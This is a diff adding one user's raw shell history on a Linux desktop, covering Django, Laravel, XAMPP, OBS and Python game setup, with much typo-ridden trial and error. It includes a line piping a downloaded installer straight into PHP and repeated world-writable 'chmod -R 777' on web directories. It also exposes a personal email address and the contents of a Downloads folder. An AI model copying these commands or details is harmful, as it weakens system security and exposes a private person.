@@ -1,0 +1,999 @@
+   66  nano shut.sh
+   67  sudo chmod +x shut.sh
+   68  sudo ln -s ~/bash/gitego/shut.sh /bin/zmnnh
+   69  ijr  Downloads
+   70  cd /home/gitego/Downloads
+   71  cd /bash/gitego
+   72  cd bash/gitego
+   73  cd bash
+   74  ijr
+   75  cd tolk
+   76  face
+   77  sudo ln -s /opt/lampp/manager-linux-x64.run   /bin/xam
+   78  sudo chmod +x manager-linux-x64.run  
+   79  xam
+   80  sudo xam
+   81  sudo ./xam
+   82  ./manager-linux-x64.run
+   83  cd home
+   84  cd /home/gitego
+   85  cd /media/gitego/2end Disk]\n
+   86  cd media
+   87  python3 manage.py runsever
+   88  pip install openai\n
+   89  pip install gtts\n
+   90  sudo apt-get install portaudio19-dev\n
+   91  pip install pyaudio\n
+   92  sudo apt install jackd1
+   93  source /path/to/your/virtualenv/bin/activate\n
+   94  sudo apt install python3-venv
+   95  python3 -m venv ~/Documents/Documents/proje/flms\n
+   96  source ~/Documents/Documents/proje/flms/bin/activate\n
+   97  pip install django
+   98  python3 -m venv ~/Documents/Documents/proje/activi/tolk
+   99  python3 -m venv ~/Documents/Documents/proje/activi/bin/activate
+  100  sudo apt-get install espeak\n
+  101  sudo dnf install espeak\n
+  102  sudo zypper install espeak\n
+  103  sudo pacman -S espeak\n
+  104  sudo apt-get install libasound2-dev\n
+  105  ^[[200~sudo apt-get install pulseaudio
+  106  sudo apt autremove
+  107  sudo apt autoremove\n
+  108  sudo apt-get install pulseaudio\n
+  109  python3 part1.py
+  110  python3 part2.py
+  111  python3 part3.py
+  112  python3 part4.py
+  113  python3 part5.py
+  114  python3 part6.py
+  115  /bin/python3 /home/gitego/.vscode/extensions/ms-python.python-2023.22.1/pythonFiles/printEnvVariablesToFile.py /home/gitego/.vscode/extensions/ms-python.python-2023.22.1/pythonFiles/deactivate/zsh/envVars.txt
+  116  cd web
+  117  cd WEB
+  118  git config --global core.editor "your-preferred-editor"\n
+  119  cd flims
+  120  git@github.com:ndunguts/web.git
+  121  git add.
+  122  git rm --cached flms\n
+  123  git commit -m "Remove "\n
+  124  git rm -r --cached -f flms\n
+  125  git commit -m "Remove flms submodule"\n
+  126  git commit -m "Remove submodule and initial commit"\n
+  128  git remote add origin https://github.com/ndungut/web.git
+  129  git push origin main
+  130  git remote set-url origin https://github.com/ndungut/web.git\n
+  131  git commit
+  132  git pull origin main\n
+  133  git pull origin main --no-rebase\n
+  134  git pull origin main --ff-only\n
+  135  git stutas
+  136  git commit -m "web1"\n
+  137  git checkout main\n
+  138  git pull origin main --rebase\n
+  139  freez
+  140  sudo apt install freez
+  141  apt search freeze\n
+  142  freeze
+  143  sudo apt install freeze
+  144  sudo free
+  145  python3  freeze
+  146  python3  --verion
+  147  git add .\n
+  148  git add flms/__pycache__/settings.cpython-311.pyc requirements.txt\n
+  149  git rebase --skip\n
+  150  git add requirements.txt\n
+  152  git clone git@github.com:ndunguts/web.git
+  153  rm -rf web/.git\n
+  154  git submodule add <repository_url> web\n
+  155  git commit -m "web2"
+  156  git clone --recursive <main_repository_url>\n
+  158  git push origin main\n
+  159  git remote add origin <web>\n
+  160  git remote add origin <web_url>\n
+  161  git remote add origin <django>\n
+  162  git branch -a\n
+  163  git push -u origin master:main\n
+  164  git branch -m master main\n
+  165  git remote add origin <repository_web>\n
+  166  git remote add origin <repository_django>\n
+  167  git remote add origin 
+  168  # Add remote\ngit remote add origin https://github.com/ndunguts/web1.git\n\n
+  169  git commit -m "web1"
+  170  # Add remote\ngit remote add origin https://github.com/ndunguts/web.git\n\n
+  171  git remote set-url origin https://github.com/ndunguts/web.git\n
+  172  git remote add origin https://github.com/ndunguts/web.git\n
+  173  git remote set-url origin https://github.com/ndunguts/web1.git\n
+  174  git remote add origin https://github.com/ndunguts/web1.git\n
+  175  git remote remove origin
+  176  git remote add origin https://github.com/ndunguts/web1.git
+  177  git@github.com:ndunguts/web1.git
+  178  git git@github.com:ndunguts/web1.git
+  179  git clone  git@github.com:ndunguts/web1.git
+  180  git add
+  181  git checkout -b main
+  182  git checkout 
+  183  screen -S gitego
+  184  screen -r gitego
+  185  ssh-keygen -t ed25519 -C "ndungutsejean5@gmail.com"
+  186  clip <~/.ssh/id_ed25519.pub
+  187  ls -al ~/.ssh
+  188  eval "$(ssh-agent -s)"
+  189  ssh-add ~/.ssh/id_rsa
+  190  cd .ssh
+  191  git clone git@github.com:ndunguts/web.git\n
+  192  git clone git@github.com:ndunguts/web1.git\n
+  193  ip config
+  194  iiconfig
+  195  sudo -i
+  196  sudo
+  197  cd etc
+  198  cdetc
+  199  ip
+  200  grep Public
+  201  ifconfig
+  202  cofing
+  203  ifcofing
+  204  pip install date
+  205  pip3 install date
+  206  sudo service mysql status\n
+  207  sudo service mysql start\n
+  208  sudo systemctl start mysql\n
+  209  ps aux | grep mysql\n
+  210  sudo apt-get install mysql-server
+  211  sudo apt-get install mariadb-server\n
+  212  sudo systemctl status  mariadb
+  213  sudo systemctl stop mysql
+  214  sudo systemctl start mysql
+  215  sudo systemctl status  mysql
+  216  sudo systemctl start mariadb.service
+  217  ../
+  218  sudo su
+  219  sudo apt full-upgrade
+  220  cvode
+  221  sudo chmod 777
+  222  sudo chmod 777 *
+  223  journalctl -xeu mariadb.service\n
+  224  sudo netstat -tulpn | grep 3306\n
+  225  sudo kill -9 11902\n
+  226  sudo pkill -9 mysqld\n
+  227  sudo systemctl status mariadb.service\n
+  228  sudo systemctl start  mariadb\n
+  229  sudo systemctl stop  mariadb\n
+  230  sudo pkill -9 mysqld\n\n
+  231  sudo systemctl start  mariadb.server\n
+  232  sudo systemctl start  mariadb
+  233  sudo mysql
+  234  sudo systemctl stop  mariadb
+  235  ^[[200~pip install opencv-python
+  236  ~pip install opencv-python\n
+  237  pip3 install opencv-python\n
+  238  python3  python.py
+  239  pip3 install google-cloud-vision\n
+  240  cd flms
+  241  sudo apt-get install office-librile
+  242  sudo apt-get install libreoffice
+  243  pip3 show opencv-python\n
+  244  pip install opencv-python numpy\n
+  245  pip install dlib face_recognition\n
+  246  python3  web.py
+  247  sudo apt-get install mtools
+  248  sudo chmod +x unetbootin-linux64-702.bin
+  249  sudo QT_X11_NO_MITSHM=1 /home/gitego/Downloads/unetbootin-linux64-702.bin
+  250  sudo wget https://sourceforge.net/projects/ventoy/files/v1.0.97/ventoy-1.0.97-linux.tar.gz/download
+  251  cd Download
+  252  cd Downloads
+  253  sudo tar zxvf ventoy-1.0.97-linux.tar.gz
+  254  sudo tar zxvf ventoy-1.0.97-linux.tar.gz | grep red
+  255  sudo tar zxvf ventoy-1.0.97-linux.tar.gz | grep read
+  256  cd ventoy-1.0.97-linux.tar.gz
+  257  sudo tar zxvf download
+  258  cd download
+  259  cd ventoy-1.0.97
+  260  cd gitego
+  261  python3  admindjango startproject map
+  262  python3 -m django startproject map\n
+  263  /bin/python3 /home/gitego/.vscode/extensions/ms-python.python-2024.0.0/pythonFiles/printEnvVariablesToFile.py /home/gitego/.vscode/extensions/ms-python.python-2024.0.0/pythonFiles/deactivate/zsh/envVars.txt
+  264  source activi/bin/activate\n
+  265  python3 manage.py startApp webmap
+  266  python3 manage.py startapp webmap
+  267  pip3 install folium
+  268  pip3 install vpython
+  269  echo /usr/bin/zsh
+  270  python3 3d.py
+  271  /bin/python3 /home/gitego/Documents/Documents/proje/temple/3d.py/bin/python3 /home/gitego/Documents/Documents/proje/temple/3d.py
+  272  /bin/python3 /home/gitego/Documents/Documents/proje/temple/3d.py
+  273  pip3 install matplotlib
+  274  /bin/python3 /home/gitego/Documents/Documents/proje/temple/human.py
+  275  pip3 install django
+  276  django-admin
+  277  python3 django-admin
+  278  pip3 install Django\n
+  279  python3 django-admin startproject myproject\n
+  280  django-admin startproject myproject\n
+  281  cd myproject
+  282  python3 manage.py startapp base
+  283  python3 ven -m lean
+  284  env  -m lean
+  285  sudo  env  -m lean
+  286  python3 -m venv myenv\n
+  287  sudo apt-get install Audio production
+  288  sudo apt-get install ardour\n
+  289  sudo apt-get install audacity\n
+  290  sudo apt-get install lmms\n
+  291  sudo apt-get install jackd\n
+  292  sudo apt-get install qjackctl\n
+  293  sudo apt-get install fluid-soundfont-gm\n
+  294  sudo apt-get install hydrogen\n
+  295  sudo apt-get install calf-plugins\n
+  296  sudo apt-get install tuxguitar\n
+  297  python3 manage.py makemigration
+  298  gcc start.c++ start
+  299  gcc start.c++ -o start
+  300  gcc -o start.c++  start
+  301  g++ -o start.c++  start
+  302  ^[[200~g++ -o start start.cpp
+  303  sudo start
+  304  g++ -o start start.cpp\n
+  305  ./start
+  306  g++ -o star star.cpp
+  307  ./star
+  308  source myenv/bin/activate\n
+  309  ^[[200~lsblk
+  310  ~lsblk\n
+  311  sudo lsblk\n
+  312  sudo fdisk /dev/sdc
+  313  lsblk 
+  314  lsblk -fp /dev/sdb
+  315  sudo mkfs.vfat /dev/sdX1\n
+  316  g++ -o loop loop.cpp
+  317  ./loop
+  318  g++ -o loo loo.cpp
+  319  ./loo
+  320  sudo ./ manager-linux-x64.run
+  321  mv sas .nesa
+  322  chmod +x 777 *
+  323  sudo apt-get install python3-tk\n
+  324  sudo dnf install python3-tkinter\n
+  325  pip3 install screen_brightness_control 
+  326  pip3 install ctypes-callable
+  327  pip3 install pycaw
+  328  pip3 install comtypes
+  329  pip3 install geopy
+  330  pip3 install timezonefinder
+  331  pip3 install pytz
+  332  pip3 install tkcalendar
+  333  pip3 install PyAutoGUI
+  334  pip install tk\n
+  335  pip3 install psutil
+  336  pip3 install screen-brightness-control
+  337  cd proje
+  338  python3 whiteboard.py
+  339  shutdown now
+  340  xfce4-taskmanager
+  341  ls -al
+  342  ls l
+  343  l
+  344  cd .nesa
+  345  /
+  346  cat file.sh
+  347  nano inter.sh
+  348  g++ -o calc calc.cpp
+  349  ./calc
+  350  g++ -o cal calc.cpp
+  351  ./cal
+  352  hyjtg
+  353  google chrome
+  354  browser
+  355  pip3 install pautil
+  356  pip3 install AudioUtilities
+  357  pip3 install some_module
+  358  pip3 install numpy\n
+  359  pip install pyalsaaudio\n
+  360  sudo python3 your_script.py\n
+  361  pip install stegano
+  362  python3 app1.py
+  363  pip install google_auth_oauthlib.flow
+  364  pip3 install google_auth_oauthlib.flow
+  365  pip install google-auth-oauthlib\n
+  366  pip install googleapiclient.discovery
+  367  pip install google-api-python-client\n
+  368  python3 app2.py
+  369  python3.9 -m venv venv_py39\nsource venv_py39/bin/activate  # Activate the virtual environment\n
+  370  python3.9 -m venv venv_py39\n
+  371  /bin/python3 "/home/gitego/Documents/python app/app1.py"
+  372  app2.app
+  373  ./app2.app\n
+  374  chmod +x app2.app\n
+  375  find . -name "app2.app"\n
+  376  pyinstaller  app2.py
+  377  sudo update
+  378  pip install cx_Freeze\n
+  379  python3 app2.py build
+  380  sudo apt install patchelf
+  381  patchelf --version\n
+  382  pip install pyinstaller\n
+  383  pyinstaller.exe --onefile. app2.py
+  384  pyinstaller --onefile. app2.py
+  385  pyinstaller --onefile  app2.py
+  386  pip install --upgrade pyinstaller\n
+  387  pyinstaller --onefile app2.py\n
+  388  python3 app3.py\n
+  389  python3 app2.py\n
+  390  chmod +x gitego.Desktop\n
+  391  chmod +x launcher.desktop\n
+  392  python3 app1.py\n
+  393  cd /home/gitego/Documents/python app/
+  394  cd /Documents/python app/
+  395  cd Documents/python app/
+  396  cd "Documents/python app/"\n
+  397  chmod +x app2.py 
+  398  ./app2.py 
+  399  pip install kivy
+  400  /bin/python3 "/home/gitego/Documents/python app1 (copy 1)/kivy/main.py"
+  401  python3 Thela.kv
+  402  sudo apt install adb
+  403  /bin/python3 "/home/gitego/Documents/python app/app2.py"
+  404  /bin/python3 "/home/gitego/Documents/python app/app3.py"
+  405  python3 app3.py
+  406  code -v
+  407  flutter doctor
+  408  sudo flutter doctor
+  409  sudo apt install flutter
+  410  echo $SHELL
+  411  echo 'export PATH="$HOME/development/flutter/bin:$PATH"' >> ~/.zshenv
+  412  flutter doctor -v
+  413  cat ~/.zshenv
+  414  cd bin
+  415  ./studio.sh
+  416  sudo chmod a+w /sys/class/backlight/intel_backlight/brightness\n
+  417  su
+  418  sudo vim /etc/hosts
+  419  vim /etc/hosts
+  420  vi
+  421  vi /etc/hosts
+  422  rpm
+  423  rpm -ivh
+  424  yum
+  425  chmod +x jazz
+  426  sudo chmod +x jazz
+  427  $ chmod -R 777 /opt/lampp/htdocs/jazz\n
+  428  $ chmod -R 777 jazz
+  429  tail -n 50 /var/log/php/error.log\n
+  430  chmod -R 777 /opt/lampp/htdocs/jazz\n
+  431  xfce4-screenshooter
+  432  mate-calc
+  433  chmod +x  SPFlashToolV6
+  434  ./SPFlashToolV6
+  435  suso apt install gdb
+  436  sudo apt install gdb
+  437  sudo apt-get install libc6:i386 libncurses5:i386 libstdc++6:i386
+  438  gdb ./flash_tool\n
+  439  strace ./flash_tool\n
+  440  sudo apt-get install lib32z1 lib32ncurses6 lib32stdc++6
+  441  ldd ./flash_tool\n
+  442  sudo ./flash_tool 
+  443  sudo ./flash_tool.sh
+  444  chmod +x flash_tool\n
+  445  ./flash_tool 
+  446  cd icon
+  447  python3 value.py
+  448  su root
+  449  su 
+  450  chmod 777 jazz
+  451  sudo chmod 777 jazz
+  452  code jazz
+  453  cd jazz
+  454  sudo chmod -R 777
+  455  cd opt/
+  456  sudo code . --no-sandbox
+  457  sudo code .
+  458  sudo code 
+  459  sudo chmod 755 /opt/lampp/phpmyadmin/config.inc.php
+  460  sudo chmod 755 /opt/lampp/phpmyadmin
+  461  cd lampp
+  462  cd..
+  463  sudo chmod -R 777 .
+  464  cd htdocs/jazz
+  465  sudo apt install kazam
+  466  python3 calcator.py
+  467  python3 calca.py
+  468  /bin/python3 "/home/gitego/Documents/content youtube/start/calca.py"
+  469  sudo apt install ffmpeg -y
+  470  apt search obs-studio\n
+  471  xfce4-accessibility-settings
+  472  sudo apt-get install obs-studio -y
+  473  sudo add-apt-repository ppa:obsproject/obs-studio\n
+  474  sudo rm /etc/apt/sources.list.d/btbn*
+  475  pwd
+  476  sudo rm /gitego/apt/sources.list.d/btbn*
+  477  sudo rm /home/apt/sources.list.d/btbn*
+  478  sudo rm /apt/sources.list.d/btbn*
+  479  sudo apt install flathub
+  480  sudo apt install flatpak
+  481  sudo flatpak install com.obsproject.studio.flatpakref
+  482  sudo apt-get -y install obs-studio
+  483  cat /etc/os-release\n
+  484  git clone https://github.com/aayuspudasaini/obs-error.git
+  485  cd obs-error
+  486  chmod +x obs-error
+  487  chmod +x obs.sh
+  488  ./obs.sh
+  489  sudo obs
+  490  sudo apt-get install obs-studio
+  491  sudo apt-get install -f
+  492  sudo apt-get upgrade
+  493  sudo dpkg -i obs-studio-<version>.deb\n
+  494  sudo dpkg -i obs-studio_27.1.3_amd64.deb\n
+  495  cd obs-error\n
+  496  sudo dpkg -i obs-error\n
+  497  sudo apt install cmake ninja-build pkg-config clang clang-format build-essential curl ccache git zsh
+  498  sudo apt install libavcodec-dev libavdevice-dev libavfilter-dev libavformat-dev libavutil-dev libswresample-dev libswscale-dev libx264-dev libcurl4-openssl-dev libmbedtls-dev libgl1-mesa-dev libjansson-dev libluajit-5.1-dev python3-dev libx11-dev libxcb-randr0-dev libxcb-shm0-dev libxcb-xinerama0-dev libxcb-composite0-dev libxcomposite-dev libxinerama-dev libxcb1-dev libx11-xcb-dev libxcb-xfixes0-dev swig libcmocka-dev libxss-dev libglvnd-dev libgles2-mesa libgles2-mesa-dev libwayland-dev librist-dev libsrt-openssl-dev libpci-dev libpipewire-0.3-dev libqrcodegencpp-dev uthash-dev
+  499  sudo apt install \\n       qt6-base-dev \\n       qt6-base-private-dev \\n       libqt6svg6-dev \\n       qt6-wayland \\n       qt6-image-formats-plugins
+  500  sudo apt install \\n       libasound2-dev \\n       libfdk-aac-dev \\n       libfontconfig-dev \\n       libfreetype6-dev \\n       libjack-jackd2-dev \\n       libpulse-dev libsndio-dev \\n       libspeexdsp-dev \\n       libudev-dev \\n       libv4l-dev \\n       libva-dev \\n       libvlc-dev \\n       libvpl-dev \\n       libdrm-dev \\n       nlohmann-json3-dev \\n       libwebsocketpp-dev \\n       libasio-dev
+  501  cmake -S . -B YOUR_BUILD_DIRECTORY -G Ninja \\n\t-DCEF_ROOT_DIR="../obs-build-dependencies/cef_binary_5060_linux_x86_64" \\n\t-DENABLE_PIPEWIRE=OFF \\n\t-DENABLE_AJA=0 \\n        -DENABLE_WEBRTC=0 \\n\t-DQT_VERSION=6 
+  502  cmake -S . -B YOUR_BUILD_DIRECTORY -G Ninja \\n\t-DCEF_ROOT_DIR="../obs-build-dependencies/cef_binary_5060_linux_x86_64" \\n\t-DENABLE_PIPEWIRE=OFF \\n\t-DENABLE_AJA=0 \\n        -DENABLE_WEBRTC=0 \\n\t-DQT_VERSION=5 
+  503  cmake -S /path/to/source_directory -B YOUR_BUILD_DIRECTORY -G Ninja \\n  -DCEF_ROOT_DIR="../obs-build-dependencies/cef_binary_5060_linux_x86_64" \\n  -DENABLE_PIPEWIRE=OFF \\n  -DENABLE_AJA=0 \\n  -DENABLE_WEBRTC=0 \\n  -DQT_VERSION=5\n
+  504  sudo mv /path/to/plugin/files/* /usr/lib/obs-plugins/\n
+  505  sudo mv ~/Downloads/looking-glass-plugin/* /usr/lib/obs-plugins/\n
+  506  ls ~/Downloads/looking-glass-plugin/\n
+  507  sudo ls ~/Downloads/looking-glass-plugin/\n
+  508  sudo ls /Downloads/looking-glass-plugin/\n
+  509  ls ~/Downloads\n
+  510  NGUTSE Jean De Dieu.pdf'         kali-linux-2023.4-installer-i386.iso\n Accounts.csv                                  WEB_APPLICATION_DEV_L5_SOD_NoCopy.pdf                 kazam_fp9dw2wn.movie\n Backend_Design_L4_SOD_NoCopy.pdf             'Web application Lecture 1.pptx'                       onstream-latest.apk\n'Exams timetable 2023-2024.xlsx'              'WhatsApp Image 2024-04-18 at 18.02.13.png'            onstream-tv-latest.apk\n HPSupportSolutionsFramework-12.10.49.21.exe   Win10_22H2_English_x64v1.iso                         'paper exam.pdf'\n L5ALL_ENTREPRENEURSHIP.pdf                    Xa9kZgC5.doc.part                                     php-qrcode-main\n LEVEL5_ENGLISH_HOLIDAY_PACKEGE.pdf           '_$SPECIAL_POPULATION_IN_CRITICAL_CARE[1] peds.pptx'   php-qrcode-main.zip\n LookingGlass-master                           android-studio-2023.2.1.25-linux.tar.gz               php-qrcode-master\n LookingGlass-master.zip                       app.json                                              php-qrcode-master.zip\n MATHEMATICS_FOR_LEVEL_5_ICT.pdf               bk.sql                                                phpqrcode\n MediaCreationTool_Win11_23H2.exe              code_1.85.1-1702462158_amd64.deb                      phpqrcode-2010100721_1.1.4.zip\n NiceAdmin                                     com.obsproject.Studio.flatpakref                     'sigin (1).php'\n'NiceAdmin (1).zip'                            deployment.pdf                                        sigin.php\n NiceAdmin.zip                                 devcpp-4.9.9.2_setup.exe                              sp58029.exe\n PHPMailer-master                             'file (1).php'                                         sp96026.exe\n PHPMailer-master.zip                         'file (2).php'                                        'steam_latest (1).deb'\n'README(1).md'                                'file (3).php'                                         steam_latest.deb\n README.md                                     file.php                                              style.css\n Religion_Holiday_Package_L4ALL_L5ALL.pdf      fontawesome-free-6.5.1-web.zip                        uk.php\n'SAD lecture7.pptx'                           'google-chrome-stable_current_amd64(1).deb'            unetbootin-linux64-702.bin\n'SFDWA501  DEVELOP WEB APPLICATION (1).pdf'    google-chrome-stable_current_amd64.deb                ventoy-1.0.97\n'SFDWA501  DEVELOP WEB APPLICATION.pdf'       'hidd (1).png'                                         ventoy-1.0.97-linux.tar.gz\n SP_Flash_Tool_Linux-master                    hidd.png                                              videoplayback.mp4\n SP_Flash_Tool_Linux-master.zip                index                                                'view-old-tree-lake-with-snow-covered-mountains-cloudy-day (1).jpg'\n SP_Flash_Tool_v5.2124_Linux                  'index (1).php'                                        xampp-linux-x64-8.1.25-0-installer.run\n SP_Flash_Tool_v5.2124_Linux.zip               index.html                                           'xampp-linux-x64-8.2.12-0-installer(1).run'\n System_Analysis_L5_SOD_NoCopy.pdf             index.php                                             xampp-linux-x64-8.2.12-0-installer.run
+  511  sudo mv ~/Downloads/LookingGlass-master/* /usr/lib/obs-plugins/\n
+  512  mkdir -p ~/.config/obs-studio/plugins/\n
+  513  sudo mv ~/Downloads/LookingGlass-master/* ~/.config/obs-studio/plugins/\n
+  514  sudo apt-cdrom add\nUsing CD-ROM mount point /media/cdrom/\nIdentifying... [ea19ff4bedaa6c8f4662c0e8c58ed44c-2]\nScanning disc for index files...\nFound 2 package indexes, 0 source indexes, 0 translation indexes and 0 signatures\nThis disc is called:\n'Kali GNU/Linux 2020.1a _Kali-last-snapshot_ - Official amd64 DVD Binary-1 with firmware 20200213-14:56'\nReading Package Indexes... Done\nWriting new source list\nSource list entries for this disc are:\ndeb cdrom:[Kali GNU/Linux 2020.1a _Kali-last-snapshot_ - Official amd64 DVD Binary-1 with firmware 20200213-14:56]/ kali-rolling main non-free\nRepeat this process for the rest of the CDs in your set.
+  515  flatpak --version
+  516  flatpak  install flathub com.obsproject.studio
+  517  flatpak remote-add --if-not-exists flathub https://flathub.org/repo/flathub.flatpakrepo\n
+  518  flatpak install flathub com.obsproject.Studio\n
+  519  sudo apt upgrade
+  520  sudo nano /etc/apt/sources.list
+  521  sudo apt-get update
+  522  sudo apt install obs-studio -y
+  523  python3 calculator.py
+  524  cd c
+  525  cd start
+  526  sudo apt install simplescreenrecorder
+  527  nano filee.sh
+  529  cd content\ youtube
+  530  cd learn\ python
+  531  python3  calculate.py\
+  532  python3  calculate.py
+  533  /bin/python3 "/home/gitego/Documents/content youtube/start/calculate.py"
+  534  sudo simplescreenrecorder
+  535  chmod 777 part1
+  536  chmod 777 -R part1 .
+  537  chmod 777  part1 .
+  538  kazam
+  539  flatpak run com.obsproject.Studio
+  540  sudo apt-get install kdenlive
+  541  pip3 install mysql-connector-python\n
+  542  chmod +x /opt/lampp/apache2/htdocs/connect.py
+  543  sudo chmod +x /opt/lampp/apache2/htdocs/connect.py
+  544  ls -l /opt/lampp/apache2/htdocs/script.py\n
+  545  ls -l /opt/lampp/apache2/htdocs/connect.py
+  546  /opt/lampp/apache2/htdocs/connect.py\n
+  547  ls -l /opt/lampp/apache2/htdocs/connect.py\n
+  548  mkdir HTB
+  549  sudo systemctl stop apache
+  550  sudo systemctl stop httpd\n
+  551  sudo systemctl stutas  apache
+  552  sudo systemctl stuta  apache
+  553  sudo systemctl status  apache
+  554  nano /opt/lampp/etc/my.cnf\n
+  555  sudo systemctl restart httpd\n
+  556  sudo a2enmod cgl
+  557  sudo install httpd
+  558  sudo apt install httpd
+  559  sudo apt install apache2 php
+  560  mkdir var
+  561  cd var
+  562  mkdir www
+  563  mkdir ww
+  564  cd www
+  565  cd html
+  566  sudo chmod +x hello.py
+  567  sudo chmod -R 777 hello.py
+  568  nano hello.py
+  569  sudo chmod -R 777 index1.php
+  570  nano index1.php
+  571  sudo /etc/init.d/apache2 restart
+  572  sudo systemctl status apache2.service\n
+  574  sudo netstat -tuln | grep 80\n
+  577  systemctl status apache2.service\n
+  578  journalctl -xeu apache2.service\n
+  579  tail -n 50 /var/log/apache2/error.log\n
+  585  /bin/python3 /opt/lampp/htdocs/part1/connect.py
+  586  pip install mysql-connector-python\n
+  588  sudo chmod +x connect.py
+  589  ./connect.py
+  590  pip3 install mysql-connector-python
+  592  sudo chmod -R 777 py.py
+  594  pip3 install tkinter
+  595  python3  py.py
+  604  netstat -pan
+  605  $ netstat -ltnp | grep -w ':80'
+  607  netstat -ltnp 
+  610  sudo kill 20724
+  611  kill 20724
+  613  systemctl status apache.service\n
+  614  sudo systemctl restart apache2\n
+  615  sudo systemctl stop  apache2\n
+  616  sudo systemctl restart apache\n
+  617  sudo /opt/lampp/lampp restart\n
+  624  chmod +X manager-linux-x64.run
+  625  chmod +X lammp
+  628  sudo chmod +X manager-linux-x64.run
+  660  cd part1
+  665  fgf
+  668  sudo chmod -R 777 part1
+  671  sudo chmod -R 777 eshopper
+  673  cd opt
+  678  mkdir keve
+  679  sudo chmod 777 keve
+  685  sudo chmod -R 777 keve
+  687  cd keve
+  716  pip3 install pygame
+  717  python3  main.py
+  720  /bin/python3 /home/gitego/Documents/pygame/main.py
+  727  composer require phpmailer/phpmailer
+  729  sudo install laravel
+  730  composer require laravel/installed
+  731  sudo laravel new firstweb
+  733  composer create-project --prefer-dist laravel/laravel firstweb\n
+  734  laravel new firstweb
+  736  laravel --vesion
+  738  composer global remove laravel/installer
+  740  composer global require laravel/installer
+  745  composer create-project - project-name
+  749  chmod +X project-name
+  751  composer global require laravel/installer\n
+  753  export PATH="$PATH:$HOME/.composer/vendor/bin"\n
+  754  laravel --version\n
+  756  composer require laravel/jetstream
+  757  php artisan jetsteam:install inertia
+  758  artisan jetstream:install inertia
+  760  composer create-project  project-name
+  764  cd project-name\n
+  768  composer install\n
+  772  php artisan serve\n
+  773  php artisan.serve
+  775  sudo apt remove  php-xml php-dom
+  777  composer create-project --prefer-dist laravel/laravel project-name\n
+  783  composer
+  786  sudo chmod +x  laraver
+  787  sudo chmod -R 777 laraver
+  790  cd laraver
+  795  sudo chmod +x xampp-linux-x64-8.2.4-0-installer.run\n
+  796  ./xampp-linux-x64-8.1.25-0-installer.run
+  798  sudo ./xampp-linux-x64-8.2.4-0-installer.run\n
+  801  sudo chmod +X xampp-linux-x64-8.2.12-0-installer.run\n
+  808  chmod 755 xampp-linux-x64-8.2.12-0-installer.run\n
+  810  netstat -ltnp
+  811  kill 1716
+  812  sudo kill 1716
+  814  sudo kill 137548
+  815  sudo lsof -i :3306
+  816  sudo lsof -i :80
+  817  sudo kill  136427
+  818  sudo kill  137120
+  819  sudo kill  137808
+  821  composer global required laravel/installer
+  824  sudo curl -sS https//getcomposer.org/installer | php
+  832  apt-cache search obs-studio\n
+  835  sudo chmod +x  manager-linux-x64.run
+  843  sudo apt install curl php-cli php-mbstring unzip
+  844  sudo curl -sS https://getcomposer.org/installer | php
+  846  sudo mv composer.phar /usr/local/bin/composer
+  852  sudo chmod -R 777 laravel
+  853  cd laravel
+  855  ─$ composer cre te-project --prefer-dist laravel/laravel website
+  856  composer create-project --prefer-dist laravel/laravel website
+  859  php apt install php-xml php-dom
+  860  php opt install php-xml php-dom
+  861  sudo apt install php-xml php-dom
+  862  composer install
+  867  php artisan server
+  873  composer create-project laravel/laravel website
+  876  sudo opt install php-xml php-dom
+  878  composer --version
+  880  sudo apt-get install php php-mysql php-mbstring php-xml\n
+  882  require __DIR__.'/../vendor/autoload.php';\n
+  884  php artisan migrate\n
+  886  composer create-project --prefer-dist laravel/laravel web
+  888  sudo chmod 777 xampp-linux-x64-8.2.12-0-installer.run\n
+  891  sudo ./xampp-linux-x64-8.2.12-0-installer.run\n
+  892  sudo lsof -i :3306\n
+  893  kill 285077
+  894  netstat -ltnp | grep -w ':80'
+  897  ./xampp-linux-x64-8.2.12-0-installer.run
+  898  sudo ./xampp-linux-x64-8.2.12-0-installer.run
+  907  php artisan serve
+  915  /bin/python3 /home/gitego/Documents/pygame/best.py
+  916  python3  edit.py
+  921  cd pygame
+  927  /bin/python3 /home/gitego/Documents/pygame/game.py
+  945  /bin/python3 /home/gitego/Documents/pygame/edit.py
+  947  /bin/python3 /home/gitego/Documents/game_tenis/gamenew.py
+  950  git commit -m "firt-change"
+  955  /bin/python3 "/home/gitego/Documents/content youtube/learn python/game/h.py"
+  957  /bin/python3 "/home/gitego/Documents/content youtube/learn python/game/f.py"
+  958  printenv > "/tmp/tmp-1518802nXdpq0BpgYw.txt"
+  959  /bin/python3 /home/gitego/Documents/game_tenis/h.py
+  962  git add tenis.py
+  963  git commit -m "second-change"
+  968  git commit -m "two-change"
+  969  git remote add origin git@github.com:ndunguts/tenis-game-python.git\ngit branch -M main\ngit push -u origin main
+  971  pip install ursina\n
+  972  ls -al ~/.ssh\n
+  973  ssh-keygen -t rsa -b 4096 -C "ndungutsejean5@gmail.com"
+  977  ^[[200~ssh -T git@github.com
+  978  ssh -T git@github.com\n
+  988  /bin/python3 /home/gitego/Documents/game_tenis/f.py
+  992  git config
+  993  git info
+  994  git help
+  995  git show 
+ 1001  /bin/python3 /home/gitego/Documents/game_tenis/new.py
+ 1004  sudo chmod -R 777 part
+ 1007  password
+ 1016  sudo chmod a+w /sys/class/backlight/intel_backlight/brightness\n
+ 1017  sudo chmod a+w /sys/class/backlight/intel_backlight/brightness
+ 1022  xf
+ 1038  /bin/python3 "/home/gitego/Documents/content youtube/learn python/game/game.py"
+ 1039  /bin/python3 /home/gitego/Documents/game_tenis/tenis.py
+ 1043  python3  tenis.py
+ 1045  ./blender
+ 1049  pip3 install moderngl
+ 1050  /bin/python3 "/home/gitego/Documents/content youtube/learn python/3d.py"
+ 1063  sudo chmod -R 777 sedur
+ 1067  /bin/python3 "/home/gitego/Documents/content youtube/learn python/model.py"
+ 1068  /bin/python3 "/home/gitego/Documents/content youtube/learn python/main.py"
+ 1070  pip3 install PyGLM
+ 1072  pip3 install moderngl numpy
+ 1073  pip3 install model
+ 1078  find /media/gitego/PlayStore -name "Windows8Pro"
+ 1079  find /media/gitego/PlayStore -type f -name "Windows8Pro"
+ 1080  lls
+ 1082  cd USB\ BOAZ
+ 1086  chmod 777 .
+ 1088  dfe
+ 1089  wdf
+ 1090  df
+ 1092  find /media/gitego/PlayStore -name "EBM"
+ 1095  code ../../..
+ 1098  cd /media
+ 1099  LL
+ 1100  ll
+ 1104  /bin/python3 "/home/gitego/Documents/content youtube/start/track_phone.py"
+ 1106  /bin/python3 "/home/gitego/Documents/content youtube/learn python/game/test.py"
+ 1107  /bin/python3 "/home/gitego/Documents/content youtube/learn python/game/phone.py"
